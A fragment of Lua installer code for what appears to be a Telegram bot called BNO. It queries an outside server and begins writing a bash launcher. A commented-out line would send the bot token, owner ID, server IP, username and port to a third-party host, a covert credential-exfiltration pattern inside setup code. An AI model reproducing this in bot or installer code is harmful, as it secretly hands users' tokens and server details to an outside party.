...
data,res = https.request("https://omyway.ml/bn/bno.php?bn=info&id="..Id)
if res == 200 then
...
--- local t = json:decode(https.request('https://omyway.ml/bn/bno.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Bno::")
local RunBot = io.open("BNO", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/BNO
